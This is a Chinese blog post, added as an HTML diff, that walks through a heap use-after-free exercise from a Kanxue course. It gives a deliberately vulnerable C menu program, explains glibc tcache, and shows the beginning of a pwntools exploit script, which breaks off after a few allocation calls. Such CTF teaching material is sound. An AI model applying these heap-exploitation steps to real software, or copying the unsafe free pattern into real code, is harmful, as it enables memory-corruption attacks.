@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="看雪大佬公开课-例题详解  我们直接从堆专题开始，也就是课程的第四天： 那么不多比比，直接开干，我先开始讲解例题uaf： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374">
+<meta property="og:type" content="article">
+<meta property="og:title" content="看雪大佬公开课-例题详解">
+<meta property="og:url" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="看雪大佬公开课-例题详解  我们直接从堆专题开始，也就是课程的第四天： 那么不多比比，直接开干，我先开始讲解例题uaf： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/1.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/2.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/3.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/4.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/5.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/6.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/7.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/8.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/9.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/10.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/11.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/12.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/13.png">
+<meta property="og:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/14.png">
+<meta property="article:published_time" content="2024-08-12T14:22:58.000Z">
+<meta property="article:modified_time" content="2024-08-12T16:03:53.918Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="堆专题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>看雪大佬公开课-例题详解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/08/27/ZJCTF-2019-EasyHeap/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&text=看雪大佬公开课-例题详解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&is_video=false&description=看雪大佬公开课-例题详解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=看雪大佬公开课-例题详解&body=Check out this article: http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&name=看雪大佬公开课-例题详解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&t=看雪大佬公开课-例题详解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">看雪大佬公开课-例题详解</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        看雪大佬公开课-例题详解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-12T14:22:58.000Z" itemprop="datePublished">2024-08-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%A0%86%E4%B8%93%E9%A2%98/" rel="tag">堆专题</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">看雪大佬公开课-例题详解</h1>
+
+<p>我们直接从堆专题开始，也就是课程的第四天：</p>
+<p>那么不多比比，直接开干，我先开始讲解例题uaf：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *heap[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(num&gt;=<span class="number">0x20</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;no more&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;how big&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">	<span class="keyword">if</span>(size&gt;=<span class="number">0x20</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;no more&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	heap[num]=(<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">	num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> idx;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx&quot;</span>);</span><br><span class="line">    (read(<span class="number">0</span>, buf, <span class="number">4</span>));</span><br><span class="line">    idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (!heap[idx]) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no hvae things\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,heap[idx]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> idx;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx&quot;</span>);</span><br><span class="line">    (read(<span class="number">0</span>, buf, <span class="number">4</span>));</span><br><span class="line">    idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (!heap[idx]) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no hvae things\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  	<span class="built_in">free</span>(heap[idx]);</span><br><span class="line">  	num--;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> idx;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx&quot;</span>);</span><br><span class="line">    (read(<span class="number">0</span>, buf, <span class="number">4</span>));</span><br><span class="line">    idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (!heap[idx]) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no hvae things\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  	<span class="built_in">puts</span>(<span class="string">&quot;how big u read&quot;</span>);</span><br><span class="line">  	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">  	<span class="keyword">if</span>(size&gt;<span class="number">0x20</span>)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="built_in">puts</span>(<span class="string">&quot;too more&quot;</span>);</span><br><span class="line">  		<span class="keyword">return</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  	read(<span class="number">0</span>,heap[idx],size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.create&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">		<span class="keyword">switch</span>(choice)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:create();<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:dele();<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:edit();<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:show();<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:<span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面是题目的源码，经过以下命令编译得到可执行程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o uaf uaf.c</span><br></pre></td></tr></table></figure>
+
+<p>可以很容易的发现，这是一道菜单题，而且存在着uaf漏洞，这个漏洞存在于dele()函数，堆块free后，并没有将对应的指针置为0，导致heap数组，对这个堆块依然可以操纵，由于ubuntu18.04引入了tcachebins这个bins，所有小于0x420的堆块被free掉时，会首先进入这个tcachebins而非fastbins或unsortedbin。但是呢，当这tcachebins存放满的时候，那它就会选择fastbins或unsortedbin，它存放满的条件是存放到7个(是0x20到0x420每个大小的堆块都能存放7个)。</p>
+<p>当然，在我们做题之前，我觉得我有必要向大家介绍一下ubuntu18.04的另一个东西tcache，tcache也是一个堆，位于堆的开头，它的大小呢，是0x250它的详细介绍可以参考：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/?h=tcache">tcache - CTF Wiki (ctf-wiki.org)</a>，我呢，就简单的说一下，它与我们的tcachebins关系很大，每一种大小的放入tcachebins的堆的数量，tcache这个堆块都有记载，举个例子吧，说也很难说清楚，我们先申请一个0x10的堆，然后将其释放，我们来观察tcache与tcachebins：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/1.png" alt="1"></p>
+<p>可以看到，tcachebins已经有了属于它的第一个东西：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/2.png" alt="2"></p>
+<p>可以看到tcachebins中0x20大小的堆块，写的是1，我所在tcache堆块中圈起来的一个字节就是记录0x20大小的堆块个数的地方，依次向后类推，当然了，这个tcache堆块，也记录着每个对应大小的堆块的起始地址(这里指向的是并不是chunk头，而是chunk的data区域)，图上呢，就是0x20大小的堆块的其实地址，依次类推。我们来申请两个0x10大小的堆并释放，看看是不是这莫个事：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/3.png" alt="3"></p>
+<p>看起来，是对的，这里我再说一个点，就是tcachebins不同于fastbins，虽然都有FD指针，但是tcachebins的FD指针指向的是chunk的data区域，而不是chunk头。</p>
+<p>接下来，我放出我自己的payload并一步一步解释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./uaf&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;how big\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">inx</span>):</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(inx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">inx, size, content</span>):</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(inx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;how big u read\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">inx</span>):</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(inx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 0 num = 1</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 1 num = 2</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 2 num = 3</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 3 num = 4</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 4 num = 5</span></span><br><span 